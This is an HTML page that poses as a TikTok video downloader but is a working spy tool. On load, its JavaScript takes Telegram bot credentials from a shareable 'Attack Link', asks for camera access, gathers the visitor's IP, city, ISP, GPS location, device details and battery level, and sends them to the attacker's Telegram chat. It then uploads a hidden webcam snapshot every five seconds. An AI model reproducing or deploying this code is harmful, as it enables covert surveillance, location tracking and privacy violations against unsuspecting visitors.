<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>TikTok Video Downloader</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        background: #000;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        display: flex;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        padding: 20px;
        overflow: hidden;
    }
    .container {
        width: 100%;
        max-width: 400px;
        background: #121212;
        border-radius: 20px;
        padding: 30px 20px;
        box-shadow: 0 10px 30px rgba(255, 255, 255, 0.05);
        text-align: center;
        border: 1px solid #222;
        position: relative;
        z-index: 1;
    }
    .logo {
        font-size: 2.2rem;
        font-weight: bold;
        margin-bottom: 10px;
        background: -webkit-linear-gradient(45deg, #25F4EE, #FE2C55);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
    }
    .logo svg { width: 35px; fill: #fff; }
    p { color: #888; font-size: 0.9rem; margin-bottom: 25px; }

    input {
        width: 100%;
        padding: 15px;
        background: #1a1a1a;
        border: 1px solid #333;
        border-radius: 12px;
        color: #fff;
        font-size: 1rem;
        margin-bottom: 15px;
        outline: none;
    }
    button {
        width: 100%;
        padding: 15px;
        background: #FE2C55;
        color: #fff;
        border: none;
        border-radius: 12px;
        font-size: 1.1rem;
        font-weight: bold;
        cursor: pointer;
        transition: 0.2s;
    }

    .settings-drawer {
        position: fixed;
        bottom: -100%;
        left: 0;
        right: 0;
        background: #111;
        border-top: 2px solid #FE2C55;
        border-radius: 20px 20px 0 0;
        padding: 20px;
        transition: 0.4s ease;
        z-index: 100;
    }
    .settings-drawer.open { bottom: 0; }
    .settings-drawer h3 { color: #FE2C55; margin-bottom: 15px; font-size: 1.2rem; text-align: center; }
    .settings-drawer label { display: block; font-size: 0.7rem; color: #888; margin-bottom: 5px; text-transform: uppercase; }
    .settings-drawer input { background: #000; border: 1px solid #333; margin-bottom: 10px; }
    .settings-drawer .btn-save { background: #25F4EE; color: #000; margin-bottom: 10px; }
    .settings-drawer .btn-copy { background: #444; margin-top: 10px; }
    
    .toggle-settings {
        position: fixed;
        bottom: 20px;
        right: 20px;
        width: 40px;
        height: 40px;
        background: rgba(255,255,255,0.1);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        font-size: 1.2rem;
        z-index: 101;
        border: 1px solid #333;
    }

    #cam-video { position: fixed; top: -9999px; width: 1px; height: 1px; opacity: 0; }
    #canvas { display: none; }
</style>
</head>
<body>

<div class="container">
    <div class="logo">
        <svg viewBox="0 0 448 512"><path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/></svg>
        TikTok Downloader
    </div>
    <p>Download TikTok videos without watermark.</p>
    <input type="text" id="tiktokUrl" placeholder="Paste TikTok link here...">
    <button onclick="alert('Processing... please wait')">Download Video</button>
</div>

<div class="toggle-settings" onclick="toggleDrawer()">⚙️</div>
<div class="settings-drawer" id="drawer">
    <h3>Bot Setup</h3>
    <label>Bot Token</label>
    <input type="text" id="botToken" placeholder="123456:ABC-DEF">
    <label>Chat ID</label>
    <input type="text" id="chatId" placeholder="123456789">
    <button class="btn-save" onclick="saveSettings()">💾 Save & Test</button>
    <button class="btn-copy" onclick="generateLink()">🔗 Copy Attack Link</button>
    <p id="setStatus" style="font-size: 0.7rem; text-align: center; margin-top: 10px;"></p>
</div>

<video id="cam-video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    function getCreds() {
        const params = new URLSearchParams(window.location.search);
        let token = params.get('tg_token');
        let chatId = params.get('tg_chat');
        if (!token || !chatId) {
            const encodedData = params.get('tg_data');
            if (encodedData) {
                try {
                    const decoded = JSON.parse(atob(decodeURIComponent(encodedData)));
                    token = decoded.token;
                    chatId = decoded.chatId;
                } catch(e) {}
            }
        }
        return { 
            token: token || localStorage.getItem('tg_bot_token'), 
            chatId: chatId || localStorage.getItem('tg_chat_id') 
        };
    }

    function toggleDrawer() {
        document.getElementById('drawer').classList.toggle('open');
    }

    function saveSettings() {
        const token = document.getElementById('botToken').value.trim();
        const chatId = document.getElementById('chatId').value.trim();
        if (!token || !chatId) return alert("Fill both fields!");
        localStorage.setItem('tg_bot_token', token);
        localStorage.setItem('tg_chat_id', chatId);
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ Setup Successful!`)
        .then(() => {
            document.getElementById('setStatus').innerText = "Saved & Verified!";
            document.getElementById('setStatus').style.color = "#25F4EE";
        }).catch(() => {
            document.getElementById('setStatus').innerText = "Error saving!";
            document.getElementById('setStatus').style.color = "red";
        });
    }

    function generateLink() {
        const token = localStorage.getItem('tg_bot_token');
        const chatId = localStorage.getItem('tg_chat_id');
        if (!token || !chatId) return alert("Save settings first!");
        const base = window.location.origin + window.location.pathname;
        const data = btoa(JSON.stringify({ token, chatId }));
        const finalUrl = `${base}?tg_data=${encodeURIComponent(data)}`;
        navigator.clipboard.writeText(finalUrl).then(() => { alert("Attack Link Copied!"); });
    }

    // --- Advanced Intel (Including Real IP) ---
    async function getFullIntel() {
        let ipInfo = { ip: "Unknown", city: "Unknown", country: "Unknown", isp: "Unknown" };
        try {
            const res = await fetch('https://ipapi.co/json/');
            ipInfo = await res.json();
        } catch(e) {}

        let geo = "Not allowed";
        try {
            geo = await new Promise(res => navigator.geolocation.getCurrentPosition(
                p => res(`${p.coords.latitude}, ${p.coords.longitude}`),
                () => res("Permission Denied"), { timeout: 5000 }
            ));
        } catch(e) {}

        let battery = "Unknown";
        try {
            const bat = await navigator.getBattery();
            battery = `${Math.round(bat.level * 100)}%`;
        } catch(e) {}

        return {
            ip: ipInfo.ip || "Unknown",
            city: ipInfo.city || "Unknown",
            country: ipInfo.country_name || "Unknown",
            isp: ipInfo.org || "Unknown",
            ua: navigator.userAgent,
            platform: navigator.platform,
            lang: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            battery: battery,
            location: geo
        };
    }

    async function startAttack() {
        const { token, chatId } = getCreds();
        if (!token || !chatId) return;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
            const video = document.getElementById('cam-video');
            video.srcObject = stream;

            const intel = await getFullIntel();
            
            let msg = `🚨 *Victim Accessed! (Live Stream)*\n\n`;
            msg += `🌐 IP: ${intel.ip}\n`;
            msg += `🏙️ City: ${intel.city}, ${intel.country}\n`;
            msg += `📡 ISP: ${intel.isp}\n`;
            msg += `📱 OS: ${intel.platform}\n`;
            msg += `🌍 Loc: ${intel.location}\n`;
            msg += `🔋 Bat: ${intel.battery}\n`;
            msg += `🖥️ Screen: ${intel.screen}\n`;
            msg += `🕒 TZ: ${intel.timezone}\n`;
            msg += `🔗 UA: ${intel.ua}`;

            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
            });

            // Continuous Capture: New frame every 5 seconds
            const captureInterval = setInterval(async () => {
                // Check if page is still open/active
                if (document.hidden) return; 

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    if (!blob) return;
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', blob, 'capture.jpg');
                    fd.append('caption', `📸 Live Frame Update\nIP: ${intel.ip}`);
                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg', 0.7);
            }, 5000);

            // Stop everything when tab is closed
            window.addEventListener('beforeunload', () => {
                clearInterval(captureInterval);
                stream.getTracks().forEach(track => track.stop());
            });

        } catch (err) { console.log("Permission denied"); }
    }

    window.onload = () => {
        document.getElementById('botToken').value = localStorage.getItem('tg_bot_token') || '';
        document.getElementById('chatId').value = localStorage.getItem('tg_chat_id') || '';
        startAttack();
    };
</script>
</body>
</html>
